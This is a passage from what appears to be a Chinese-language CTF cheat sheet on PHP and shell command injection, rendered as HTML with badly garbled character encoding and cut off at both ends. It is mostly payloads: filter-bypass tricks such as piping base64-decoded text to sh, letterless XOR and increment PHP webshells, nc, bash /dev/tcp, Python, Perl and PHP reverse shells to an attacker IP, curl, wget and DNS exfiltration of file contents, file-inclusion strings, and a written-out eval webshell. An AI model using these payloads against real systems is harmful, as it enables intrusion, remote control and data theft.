</p></li><li><p>catè¿‡æ»¤</p><ul><li>echo base64å‘½ä»¤|base64 -d|sh    </li><li>echo hexå‘½ä»¤|xxd -r -p|sh </li><li>æ¢æˆ fmt more less rev ca\t</li></ul></li><li><p>å…³é”®å­—è¿‡æ»¤</p><ul><li>æ’å…¥åæ–œçº¿ ca\t     è´´è´´â€™câ€™â€™aâ€™â€™tâ€™  ${}æ‹¼å‡‘å…³é”®è¯  æ’å…¥ç©ºcaâ€™â€™t</li><li>å¯¹äºåŒ¹é…æ–‡ä»¶åç”¨é€šé…ç¬¦[a-s]</li><li>è®¾ç½®å˜é‡ cmd&#x3D;ab;a&#x3D;l;b&#x3D;s;$a$b</li></ul></li><li><p>ç¦ç”¨;</p><ul><li>||ä»£æ›¿</li></ul></li></ul><h2 id="æ— å‚æ•°rce"><a href="#æ— å‚æ•°rce" class="headerlink" title="æ— å‚æ•°rce"></a>æ— å‚æ•°rce</h2><ul><li>preg_replace(â€˜&#x2F;[a-z]+((?R)?)&#x2F;â€˜è™½ç„¶åªå…è®¸æ— å‚æ•°ï¼Œä½†æ˜¯å…è®¸å‡½æ•°å¥—ç”¨ã€‚</li><li>è·å¾—flag.php<ul><li>c&#x3D;$a&#x3D;new DirectoryIterator(â€˜glob:&#x2F;&#x2F;&#x2F;*â€™);foreach($a as $f){echo($f-&gt;__toString().â€ â€œ);}</li><li>c&#x3D;$d&#x3D;opendir(â€œ.â€);while(false!&#x3D;&#x3D;($f&#x3D;readdir($d))){echoâ€$f\nâ€;}</li><li>c&#x3D;$d&#x3D;dir(â€œ.â€);while(false!&#x3D;&#x3D;($f&#x3D;$d-&gt;read())){echo$f.â€\nâ€;}</li><li>print_r(glob(â€œ*â€)); &#x2F;&#x2F; åˆ—å½“å‰ç›®å½•</li><li>print_r(glob(â€œ&#x2F;*â€)); &#x2F;&#x2F; åˆ—æ ¹ç›®å½•</li><li>scandir(â€˜.â€™): &#x2F;&#x2F;è·å¾—ç›®å½• <ul><li>å–å‡º. <ul><li>current(localeconv())</li><li>char(46)&gt;&gt;char(rand())    &#x2F;&#x2F;è¶…å¤šæ¬¡é‡æ”¾</li><li>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))&#x2F;&#x2F;php7</li></ul></li><li>æ“ä½œæ•°ç»„ï¼š<ul><li>pos() current()ç¬¬ä¸€ä¸ªå…ƒç´ </li><li>end()- å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œäº•è¾“å‡º</li><li>next()- å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li>prev()- å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º</li><li>reset()- å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•Œç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œäº•è¾“å‡º</li><li>each()â€” è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œäº•å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨</li></ul></li></ul></li></ul></li><li>å–å‡ºæ–‡ä»¶<ul><li>å¦‚æœflag-phpåœ¨æœ€åä¸€ä¸ªï¼Œç›´æ¥ç”¨endï¼ˆï¼‰å–å‡ºå³å¯ã€‚</li><li>(1)array_reverse()&#x2F;&#x2F;è½¬ç½®æ•°ç»„<ul><li>ä»…é™äºflag.phpåœ¨æ•°ç»„çš„å€’æ•°ç¬¬äºŒä¸ªä½ç½®è¿™ç§æ‚„å†µä¸‹ã€‚</li><li>?exp&#x3D;print_r(next(array_reverse(scandir(pos(localeconv()))))):</li></ul></li><li>(2)array_rand(array_flip()) &#x2F;&#x2F;filpé”®å€¼äº’æ¢ï¼Œrandéšæœºå–é”®<ul><li>flag.phpä½ç½®åœ¨å“ªéƒ½å¯ä»¥ï¼Œä½†æ˜¯ä»–ä¸æ˜¯100%æˆåŠŸçš„ï¼Œéœ€è¦é‡æ”¾ï¼æ¦‚ç‡é—®é¢˜</li><li>?exp&#x3D;print_r(array_rand(array_flip(scandir(pos(localeconv())))));</li></ul></li></ul></li><li>session_id(session_star())   æ›´æ”¹cookieï¼šPHPSESSID&#x3D;flag.php&#x2F;&#x2F;å­—ç¬¦ä¸²æœ‰é•¿åº¦é™åˆ¶,ç›¸å½“äºæƒ³å†™å•¥å°±å†™å•¥å‘½ä»¤ä¸èƒ½æœ‰ç©ºæ ¼ï¼Œå› ä¸ºcookieä¸è§£æç©ºæ ¼</li><li>end(getallheaders())     &#x2F;&#x2F;å¾—åˆ°httpåŒ…æœ€åå­—ç¬¦ä¸²ï¼Œå¾—åˆ°ä»»æ„å­—ç¬¦ä¸²,ç”šè‡³å¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œå¥—è¿›systemç­‰å‡½æ•°</li><li>å–getçš„æœ€åä¸€ä¸ªå‚æ•°       end(pos(get_defined_vars()))       </li><li>å–postçš„æœ€åä¸€ä¸ªå‚æ•°      end(next(get_defined_vars()))      è®°å¾—bpå‘åŒ…<ul><li>è¯»å–flag.php<ul><li>æ–‡ä»¶è¯»å–çš„æ–¹æ³•<ul><li>var_dump(file_get_contents())</li><li>show_source()</li><li>highlight_file()</li><li>readfile()</li></ul></li><li>å‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•<ul><li>system(end(next(get_defined_vars())))     postä¼ å­—ç¬¦ä¸²ä¼ å…¥ cat flag.php</li></ul></li></ul></li></ul></li></ul><h2 id="æ— å­—æ¯RCE"><a href="#æ— å­—æ¯RCE" class="headerlink" title="æ— å­—æ¯RCE"></a>æ— å­—æ¯RCE</h2><ul><li>php5<ul><li>å¼‚æˆ–  postä¼  _&#x3D;phpinfo<ul><li>assert($<em>POST[</em>])</li><li><pre><code class="php">&lt;?php$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;);$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); $___=$$__;$_($___[_]);<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">- å–å  postä¼    <span class="hljs-number">2</span>=phpinfo<br>  - ```php<br>    <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$__</span>=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$__</span>/<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;ç°&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;å’Œ&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;å’Œ&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;çš„&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;åŠ&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;å§‹&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$_____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;ä¿¯&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;ç°&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;æ¬¡&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;ç«™&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$_____</span>;<span class="hljs-variable">$____</span>(<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]);<br></code></pre></td></tr></table></figure></code></pre></li></ul></li><li>é€’å¢è¿ç®— postä¼ _&#x3D;phpinfo<ul><li><pre><code class="php">&lt;?php$_=[];$_=@&quot;$_&quot;; $_=$_[&#39;!&#39;==&#39;@&#39;]; $___=$_; $__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; $___.=$__; $__=$_;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__;$____=&#39;_&#39;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$_=$$____;$___($_[_]); <figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">- php7<br>  - å–åè„šæœ¬/å¼‚æˆ–è„šæœ¬+åŠ¨æ€è°ƒç”¨<br>    - å¦‚(<span class="hljs-string">&#x27;phpinfoâ€˜//å–åç»“æœ)();(&#x27;</span><span class="hljs-keyword">system</span><span class="hljs-comment">//éœ€è¦å˜åŒ–&#x27;)(ls/ls -la)</span><br>    - ```php<br>      <span class="hljs-symbol">$</span>a=<span class="hljs-string">&#x27;phpinfo&#x27;</span>;<br>      <span class="hljs-symbol">$</span>a();<br></code></pre></td></tr></table></figure></code></pre></li></ul></li></ul></li></ul><h2 id="é€šè¿‡ä¸´æ—¶æ–‡ä»¶ä»£ç æ‰§è¡Œ"><a href="#é€šè¿‡ä¸´æ—¶æ–‡ä»¶ä»£ç æ‰§è¡Œ" class="headerlink" title="é€šè¿‡ä¸´æ—¶æ–‡ä»¶ä»£ç æ‰§è¡Œ"></a>é€šè¿‡ä¸´æ—¶æ–‡ä»¶ä»£ç æ‰§è¡Œ</h2><ul><li>å¼ºåˆ¶ä¸Šä¼ è¡¨å•.phpä¸­éšä¾¿ä¸Šä¼ ,txtæ–‡ä»¶<ul><li>POST &#x2F;?cmd&#x3D;.+&#x2F;???&#x2F;???????[@-[]? HTTP&#x2F;1.1</li><li>â€¦</li><li>ls &#x2F;</li></ul></li></ul><h2 id="æ— å›æ˜¾"><a href="#æ— å›æ˜¾" class="headerlink" title="æ— å›æ˜¾"></a>æ— å›æ˜¾</h2><ul><li>åå¼¹shell<ul><li>nc 43.323.323.2323 4444 -e &#x2F;bin&#x2F;bash    æ”»å‡»æ–¹ï¼šnc -lvnp 4444</li><li>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;&lt;æ”»å‡»è€…IP&gt;&#x2F;4444 0&gt;&amp;1</li><li>python -c â€˜import socket,subprocess,os; s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((â€œ&lt;æ”»å‡»è€…IP&gt;â€,4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p&#x3D;subprocess.call([â€œ&#x2F;bin&#x2F;bashâ€,â€-iâ€]);â€™</li><li>perl -e â€˜use Socket;$i&#x3D;â€&lt;æ”»å‡»è€…IP&gt;â€;$p&#x3D;4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(â€œtcpâ€));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,â€&gt;&amp;Sâ€);open(STDOUT,â€&gt;&amp;Sâ€);open(STDERR,â€&gt;&amp;Sâ€);exec(â€œ&#x2F;bin&#x2F;sh -iâ€);};â€™</li><li>php -r â€˜$sock&#x3D;fsockopen(â€œ&lt;æ”»å‡»è€…IP&gt;â€,4444);exec(â€œ&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3â€);â€™</li></ul></li><li>curl&#x2F;wgetå¤–å¸¦æ•°æ® :<ul><li>é¦–å…ˆåœ¨è‡ªå·±çš„å…¬ç½‘ipçš„ç½‘ç«™ç›®å½•ä¸‹å»ºç«‹ä¸€ä¸ªrecord.phpçš„æ–‡ä»¶ï¼Œé‡Œé¢å†™ä¸‹å¦‚ä¸‹ä»£ç ï¼š</li><li>å¼€å§‹æ„é€ è¯·æ±‚ï¼ˆè¯»å–ä¸å…¨çš„è¯å¯ä»¥è¿›è¡Œç¼–ç <code>cat flag|base64</code>ï¼‰ï¼š</li><li>curl http:&#x2F;&#x2F;<em>.</em>.*.**&#x2F;record.php?data&#x3D;<code>cat flag|base64</code></li><li>wget http:&#x2F;&#x2F;<em>.</em>.<em>.</em>&#x2F;record.php?data&#x3D;<code>cat flag|base64</code></li><li>æ‰§è¡Œç»“æœæ— å›æ˜¾ï¼Œé€šè¿‡burpsuiteçš„Collaborator æœåŠ¡å™¨è®°å½•ï¼Œåˆ©ç”¨<code>curl</code>å°†æ‰§è¡Œç»“æœå¸¦å‡ºæ¥ï¼Œexpå¦‚ä¸‹</li><li><a href="http://IP:PORT/?cmd=curl%20http://g3k199o7dxxxhsfg6mwal.burpcollaborator.net/?cmd=`cat%20/flag|base64`">http://IP:PORT/?cmd=curl%20http://g3k199o7dxxxhsfg6mwal.burpcollaborator.net/?cmd=`cat%20/flag|base64`</a></li></ul></li><li>dnslog:<ul><li>?cmd&#x3D;<code>sed -n &quot;3.4p&quot;fla?.php|base64</code>;curl ${a:10:30}.&lt;æ›¿æ¢çš„dnslog&gt;</li></ul></li><li>echoå†™shellæˆ–è€…cat flag &gt; testæˆ–è€…cp flag testç­‰</li><li>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨$(sleep%091)æ¥æµ‹è¯•å‘½ä»¤æ˜¯å¦æˆåŠŸæ‰§è¡Œ</li><li>å¯ä»¥çœ‹åˆ°sleep 1ï¼ŒæˆåŠŸçš„ä½¿å¾—é¡µé¢å»¶æ—¶äº†1ç§’è¿”å›ã€‚ä½†æ˜¯å¯¹äº$(ls)ï¼Œæˆ‘ä»¬æ˜¯æ— æ³•çœ‹åˆ°å›æ˜¾çš„ã€‚è¿™æ˜¯å› ä¸ºä½¿ç”¨$(ls)ä¼šæŠŠlså‘½ä»¤æ‰§è¡Œçš„ç»“æœä½œä¸ºå‚æ•°ä¼ é€’ç»™pingï¼Œpingå°†å…¶ä½œä¸ºåŸŸåè¿›è¡Œè§£æï¼Œä½†æ˜¯æ— æ³•å¾—åˆ°ç»“æœï¼Œå› æ­¤æŠŠåŸŸåè§£æå¤±è´¥çš„é”™è¯¯è¾“å‡ºåˆ°é”™è¯¯è¾“å‡ºä¸­ï¼Œä½†phpçš„systemå‡½æ•°åªè¾“å‡ºäº†æ ‡å‡†è¾“å‡ºçš„å†…å®¹ï¼Œæ²¡æœ‰è¾“å‡ºæ ‡å‡†é”™è¯¯ï¼Œå› ä¸ºæˆ‘ä»¬æ— æ³•çœ‹åˆ°ç»“æœã€‚</li><li>æˆ‘ä»¬å¯ä»¥é€šè¿‡é‡å®šå‘æ ‡å‡†é”™è¯¯åˆ°æ ‡å‡†è¾“å‡ºä¸­ï¼Œæ¥è®©systemå‡½æ•°è¾“å‡ºé”™è¯¯å›æ˜¾ï¼Œè·å–æˆ‘ä»¬æ³¨å…¥å‘½ä»¤çš„ç»“æœã€‚åœ¨shä¸­ï¼Œé”™è¯¯æè¿°ç¬¦çš„ç¼–å·æ˜¯2ï¼Œå› æ­¤é€šè¿‡2&gt;&#x2F;dev&#x2F;stdoutå°±å¯ä»¥æŠŠé”™è¯¯é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºä¸­ã€‚</li><li>å®Œæ•´çš„å‘½ä»¤ä¸ºâ€$(ls%09&#x2F;)â€%092&gt;&#x2F;dev&#x2F;stdoutï¼Œè¯¥å‘½ä»¤å¯ä»¥åˆ—ä¸¾æ ¹ç›®å½•çš„æ–‡ä»¶ã€‚è¿™é‡ŒåŒå¼•å·çš„ä½œç”¨æ˜¯ï¼Œlsçš„è¾“å‡ºä¼šäº§ç”Ÿæ¢è¡Œï¼Œå¯¼è‡´pingåªä¼šå°†ç¬¬ä¸€ä¸ªç»“æœä½œä¸ºé”™è¯¯è¾“å‡ºå‡ºæ¥ï¼Œå› æ­¤å¥—åœ¨åŒå¼•å·å†…éƒ¨ï¼Œå¯ä»¥å°†ç»“æœå…¨éƒ¨å›æ˜¾ã€‚</li></ul><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><ul><li>eval($c)&#x2F;&#x2F;eval(â€œvar_dump($code)â€);ç±»ä¼¼äºè¿™ç§æ³¨æ„é—­åˆ<ul><li>æŸ¥çœ‹å½“å‰ç›®å½•<ul><li>c&#x3D;print_r(scandir(dirname(â€˜<strong>FILE</strong>â€˜)));</li><li>print_r(scandir(dirname(<strong>FILE</strong>)));</li><li>c&#x3D;system(â€œlsâ€);</li></ul></li><li>å†çœ‹æ ¹<ul><li>c&#x3D;print_r(scandir(â€˜&#x2F;â€˜));</li><li>c&#x3D;var_export(scandir(â€˜&#x2F;â€˜));</li><li>c&#x3D;var_dump(glob(â€˜&#x2F;*â€™));</li><li>c&#x3D;$a&#x3D;new DirectoryIterator(â€˜glob:&#x2F;&#x2F;&#x2F;*â€™);foreach($a as $f){echo($f-&gt;__toString().â€ â€œ);}die(); &#x2F;&#x2F;æœ‰open_basediré™åˆ¶</li></ul></li><li>è¯»å–flag<ul><li>?c&#x3D;system($_GET[â€˜aâ€™]);&amp;a&#x3D;cat flag.php;</li><li>?c&#x3D;echo <code>cat fl&#39;&#39;ag.php</code>;</li><li>?c&#x3D;highlight_file(next(array_reverse(scandir(â€œ.â€))));</li><li>?c&#x3D;eval(end(current(get_defined_vars())));&amp;a&#x3D;system(â€œcat flag.phpâ€);</li><li>?c&#x3D;passthru(â€˜cat &#x2F;flag_is_her3â€™);</li><li>?c&#x3D;a&#x3D;g;cat$IFS$1fla$a.php</li><li>?c&#x3D;system(â€œcat fl*g.phpâ€);</li><li>?c&#x3D;system(â€œtac fl*g.phpâ€);</li><li>?c&#x3D;print_r(file(â€˜flag.phpâ€™));</li><li>?c&#x3D;var_dump(file(â€˜flag.phpâ€™));</li><li>?%20num&#x3D;file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))  &#x2F;&#x2F;å¯¹åº”charè„šæœ¬</li><li>?c&#x3D;exec(%27cat%20&#x2F;flag_is_her3%27,$array);var_dump($array);</li><li>?c&#x3D;readfile(â€œflag.phpâ€);</li><li>?c&#x3D;$a&#x3D;fopen(â€œflag.phpâ€,â€râ€);while (!feof($a)) {$line &#x3D; fgets($a);echo $line;}        &#x2F;&#x2F;ä¸€è¡Œä¸€è¡Œè¯»å–</li><li>?c&#x3D;$a&#x3D;fopen(â€œflag.phpâ€,â€râ€);while (!feof($a)) {$line &#x3D; fgetc($a);echo $line;} &#x2F;&#x2F;ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦è¯»å–</li><li>?c&#x3D;$a&#x3D;fopen(â€œflag.phpâ€,â€râ€);while (!feof($a)) {$line &#x3D; fgetcsv($a);var_dump($line);}</li><li>?c&#x3D;system(â€œcp fl*g.php a.txt â€œ); è®¿é—®&#x2F;a.txt</li><li>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system('tac%20f*');?></li><li>?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('ls /');?></li><li>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs&#x2F;Pg&#x3D;&#x3D;       &#x2F;&#x2F;(<?php system("tac flag.php");?>)</li><li>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</li><li>?c&#x3D;&#x2F;bin&#x2F;ca?${IFS}f???????</li><li>?c&#x3D;&#x2F;???&#x2F;????64%20????.???  # &#x2F;bin&#x2F;base64 flag.php</li><li>?c&#x3D;&#x2F;???&#x2F;???&#x2F;????2 ????????  # &#x2F;usr&#x2F;bin&#x2F;bzip2 flag.php</li><li>?c&#x3D;$a&#x3D;fopen(â€œflag.phpâ€,â€râ€);while($b&#x3D;fgets($a)){echo $b;}</li><li>?c&#x3D;system(â€˜echo -e â€œ &lt;?php \n error_reporting(0); \n  $c&#x3D; $_GET[&#39;c&#39;]; \n eval($c); â€œ &gt; a.phpâ€™);  è®¿é—®&#x2F;a.php?c&#x3D;system(â€œtac flag.phpâ€);</li><li>?c&#x3D;system(â€œcat fl*g.php | grep  -E â€˜fl.gâ€™ â€œ);</li></ul></li><li>æ— æ‰€è°“ï¼Œæ–‡ä»¶åŒ…å«ä¼šå‡ºæ‰‹<ul><li>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php  &#x2F;&#x2F;ä¸ç”¨åˆ†å·</li><li>GETï¼š?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;input</li><li>POSTï¼š<?php system('tac flag.php');?></li><li>c&#x3D;include(â€˜flag.phpâ€™);echo $flag;</li><li>c&#x3D;include($_GET[â€˜1â€™]); ?1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</li><li>c&#x3D;include(â€˜flag.phpâ€™);var_dump(get_defined_vars());&#x2F;&#x2F;var_dump:è¾“å‡ºæ³¨å†Œå˜é‡&#x2F;&#x2F;get_defined_vars():å‡½æ•°è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„</li><li>c&#x3D;include(â€˜&#x2F;flag.txtâ€™);var_export(get_defined_vars());</li><li>c&#x3D;include(â€œ&#x2F;flag.txtâ€);$ss&#x3D;ob_get_contents();ob_end_clean();echo $ss;</li><li>c&#x3D;include(â€˜&#x2F;flag.txtâ€™);var_export(get_defined_vars());exit();</li><li>æˆ–è€…</li><li>c&#x3D;include(â€˜&#x2F;flag.txtâ€™);var_export(get_defined_vars());die();</li><li>c&#x3D;$a&#x3D;new DirectoryIterator(â€˜glob:&#x2F;&#x2F;&#x2F;*â€™);foreach($a as $f){echo($f-&gt;__toString().â€ â€œ);}die();</li><li>æˆ–è€…</li><li>c&#x3D;var_export(glob(â€˜&#x2F;*â€™));die();</li></ul></li><li><code>include &quot;flag.php&quot;;</code>ï¼Œè¿™é‡Œé¢åº”è¯¥æœ‰flagå˜é‡ï¼Œç”¨<a href="https://www.runoob.com/php/php-get_defined_vars-function.html">get_defined_vars()</a> å‡½æ•°+var_dumpå…¨éƒ¨è¾“å‡ºå‡ºæ¥ã€‚<ul><li>var_dump(get_defined_vars());</li></ul></li></ul></li></ul><h2 id="system"><a href="#system" class="headerlink" title="system();"></a>system();</h2><ul><li>tac \find &#x2F; -inum 3673632<ul><li>printf &#x2F;fla &gt; &#x2F;tmp&#x2F;zer0b</li><li>printf g &gt;&gt; &#x2F;tmp&#x2F;zer0b</li><li>tac `tac &#x2F;tmp&#x2F;zer0b</li><li>åˆ©ç”¨bashfuckç›´æ¥è·‘</li></ul></li></ul><h2 id="fuzzshell"><a href="#fuzzshell" class="headerlink" title="fuzzshell"></a>fuzzshell</h2><p>1.ç¬¬ä¸€è¡Œä¸ºè¾“å…¥å‘½ä»¤ï¼Œæ–‡ä»¶åœ°å€ï¼Œæˆ–è€…å…¶ä»–æ•°æ®2.ç¬¬äºŒè¡Œä¸ºé»‘åå•ï¼Œç”¨ â€œ,â€ éš”å¼€å¦‚ï¼š flag,eval,cat,system ï¼Œç„¶åç‚¹å‡»é»‘åå•ï¼Œä¼šæ¸…é™¤è¾“å‡ºä¸­å­˜åœ¨é»‘åå•çš„æ•°æ®3.ç„¶åç‚¹å‡»å»é‡ã€‚4.ç‚¹å‡»å¤åˆ¶åå¯¼å…¥åˆ°burpsuiteè¿›è¡Œfuzz            é—®é¢˜æ˜¯å èµ„æºè¯¥è¶…é¢‘äº†</p><ul><li>å‘½ä»¤æ··æ·†ï¼š å¯¹linuxå‘½ä»¤è¿›è¡Œç®€å•çš„æ··æ·†</li><li>è¯»æ–‡ä»¶+æ··æ·†ï¼š ä¸éœ€è¦è¾“å…¥å‘½ä»¤ï¼Œè¾“å…¥æ–‡ä»¶çš„åœ°å€å³å¯å¦‚&#x2F;flag (æˆ–è€…&#x2F;f* &#x2F;f???)</li><li>è¯»æ–‡ä»¶ï¼šåªè¾“å‡ºä¸€äº›èƒ½æŸ¥çœ‹æ–‡ä»¶çš„å‘½ä»¤ä¸è¿›è¡Œæ··æ·†</li><li>phpè¯»æ–‡ä»¶ï¼šé¢˜ç›®ç¯å¢ƒå­˜åœ¨include()æ–‡ä»¶åŒ…å«çš„æƒ…å†µä¸‹ä½¿ç”¨</li><li>phpä»£ç æ‰§è¡Œï¼šé¢˜ç›®ç¯å¢ƒä¸­å­˜åœ¨eval()ç­‰æƒ…å†µä¸‹ä½¿ç”¨</li><li>å…«è¿›åˆ¶ç¼–ç ï¼š</li><li>åå…­è¿›åˆ¶ç¼–ç ï¼š</li><li>IPç¼–ç ï¼šipv4åœ°å€ç¼–ç ï¼ŒSSRFä½¿ç”¨</li><li>å‘½ä»¤æ··æ·†ï¼š å¯¹linuxå‘½ä»¤è¿›è¡Œç®€å•çš„æ··æ·†</li><li>è¯»æ–‡ä»¶+æ··æ·†ï¼š ä¸éœ€è¦è¾“å…¥å‘½ä»¤ï¼Œè¾“å…¥æ–‡ä»¶çš„åœ°å€å³å¯å¦‚&#x2F;flag (æˆ–è€…&#x2F;f* &#x2F;f???)</li><li>è¯»æ–‡ä»¶ï¼šåªè¾“å‡ºä¸€äº›èƒ½æŸ¥çœ‹æ–‡ä»¶çš„å‘½ä»¤ä¸è¿›è¡Œæ··æ·†</li><li>phpè¯»æ–‡ä»¶ï¼šé¢˜ç›®ç¯å¢ƒå­˜åœ¨include()æ–‡ä»¶åŒ…å«çš„æƒ…å†µä¸‹ä½¿ç”¨</li><li>phpä»£ç æ‰§è¡Œï¼šé¢˜ç›®ç¯å¢ƒä¸­å­˜åœ¨eval()ç­‰æƒ…å†µä¸‹ä½¿ç”¨</li><li>å…«è¿›åˆ¶ç¼–ç ï¼š</li><li>åå…­è¿›åˆ¶ç¼–ç ï¼š</li><li>IPç¼–ç ï¼šipv4åœ°å€ç¼–ç ï¼ŒSSRFä½¿ç”¨</li></ul><h2 id="è¡¥å……ï¼šå°è£…åè®®çš„åˆ©ç”¨"><a href="#è¡¥å……ï¼šå°è£…åè®®çš„åˆ©ç”¨" class="headerlink" title="è¡¥å……ï¼šå°è£…åè®®çš„åˆ©ç”¨"></a>è¡¥å……ï¼šå°è£…åè®®çš„åˆ©ç”¨</h2><ul><li>fopen()ã€ copy()ã€ file_exists() å’Œ filesize() çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°stream_wrapper_register() </li><li>php:&#x2F;&#x2F;input   allow_url_includeé€‰é¡¹å¿…é¡»è®¾ç½®ä¸ºonï¼Œå¦åˆ™æ— 